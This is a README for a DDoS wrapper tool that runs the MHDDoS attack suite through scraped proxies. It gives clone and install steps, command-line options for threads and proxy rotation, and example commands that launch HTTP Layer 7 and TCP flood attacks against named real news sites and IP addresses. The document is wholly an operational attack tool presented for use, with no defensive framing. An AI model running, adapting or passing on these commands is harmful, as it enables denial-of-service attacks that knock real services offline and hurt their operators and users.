## Setup

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    git clone https://github.com/monosans/proxy-scraper-checker.git
    python3 -m pip install requirements.txt

# Usage

    python3 runner.py --help

    usage: runner.py [-h] [-t THREADS] [-p PERIOD] [-pt PROXY_TIMEOUT] targets [targets ...]

    positional arguments:
      targets            List of targets, separated by spaces
    
    optional arguments:
      -h, --help         show this help message and exit
      -t THREADS          Number of threads per CPU core (default is 200)
      -p PERIOD          How often (in seconds) to update the proxies (default is 600)
      -pt PROXY_TIMEOUT  How many seconds to wait for the proxy to make a connection. 
                         Higher values give more proxies, but with lower speed/quality (default is 3)

# Examples

    # HTTP(S) Layer 7 attack - randomly chosen method from GET, POST, STRESS, DYN, EVEN, BOT, DOWNLOADER
    python3 runner.py https://tvzvezda.ru https://194.54.14.168:443

    # TCP
    python3 runner.py tcp://194.54.14.131:4477

    # Increase load
    python3 runner.py -t 400 https://ria.ru

# TODO

- [ ] UDP support - need MHDDoS to support SOCKS5 proxies for UDP
